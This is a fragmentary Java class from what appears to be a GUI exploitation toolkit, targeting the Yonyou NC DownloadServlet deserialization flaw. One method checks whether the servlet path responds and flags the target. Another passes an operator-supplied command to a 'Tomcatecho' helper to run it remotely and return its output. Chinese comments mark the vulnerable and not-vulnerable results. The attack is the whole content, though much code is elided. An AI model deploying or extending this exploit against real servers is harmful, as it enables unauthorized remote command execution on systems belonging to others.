...
public class yongyou_nc_DownloadServlet_serial implements Exploitlnterface {
    @Override
...
//        return null;
    ...
    private Boolean att(String url, TextArea textArea) {
        try {
            ...
            Response post_res = HttpTools.get(url + "/servlet/~ic/nc.document.pub.fileSystem.servlet.DownloadServlet" , head, "utf-8");
            if (post_res.getCode() != 404 && post_res.getCode() != 0) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ yongyou_nc_DownloadServlet_serial ]");
...
//                textArea.appendText("\n yongyou_nc_DownloadServlet_serial-漏洞不存在");
    ...
    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {
        ...
        try {
            String cmd_echo = Methods.Tomcatecho(url + "/servlet/~ic/nc.document.pub.fileSystem.servlet.DownloadServlet",cmd,s);
